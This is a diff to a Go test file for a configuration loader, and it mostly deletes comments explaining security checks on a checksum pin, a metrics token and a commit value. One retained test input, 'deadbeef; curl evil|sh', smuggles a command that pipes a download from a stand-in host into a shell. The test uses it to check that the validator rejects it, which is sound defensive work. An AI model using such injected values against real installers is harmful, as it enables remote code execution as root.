@@ -6,8 +6,6 @@ import (
 	"testing"
 )
 
-// testTelemtSHA is the pinned sha256 of the telemt 3.5.7 x86_64 release tarball, the same
-// value .env.example ships.
 const testTelemtSHA = "c88656514164dbae64aac68341548b95586a3898df851dad837973752e405864"
 
 func env(m map[string]string) func(string) string {
@@ -57,8 +55,6 @@ func TestLoadRejectsShortMasterKey(t *testing.T) {
 	}
 }
 
-// TestLoadRequiresMetricsTokenInGatewayMode covers I1: /metrics sits outside the auth group
-// on the public domain, so an empty METRICS_TOKEN must be a startup error, not an open door.
 func TestLoadRequiresMetricsTokenInGatewayMode(t *testing.T) {
 	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
 	base := map[string]string{
@@ -78,8 +74,7 @@ func TestLoadRequiresMetricsTokenInGatewayMode(t *testing.T) {
 	}
 }
 
-// TestLoadRejectsBadTProxyCommit covers I2: the value is interpolated into the root-run
-// installer script.
+// TestLoadRejectsBadTProxyCommit covers I2: the value is interpolated into the root-run installer script.
 func TestLoadRejectsBadTProxyCommit(t *testing.T) {
 	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
 	for _, bad := range []string{"abc", "main", "deadbeef; curl evil|sh", "DEADBEEF", ""} {
@@ -191,8 +186,6 @@ func bytesOf(b byte) []byte {
 	return out
 }
 
-// TestLoadRequiresTelemtSHAInGatewayMode: the install script makes root run the downloaded
-// telemt tarball, and the checksum is the only thing that says it is the right one.
 func TestLoadRequiresTelemtSHAInGatewayMode(t *testing.T) {
 	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
 	base := map[string]string{
@@ -235,9 +228,6 @@ func TestLoadValidatesTelemtPin(t *testing.T) {
 	}
 }
 
-// TestLoadGitHubAndUpdateCheck covers the update-check knobs: a sane default
-// repo, an opt-out that is exactly "false", and a repo slug that is validated
-// because it is interpolated into an outbound URL.
 func TestLoadGitHubAndUpdateCheck(t *testing.T) {
 	cfg, err := Load(baseEnv(nil))
 	if err != nil {
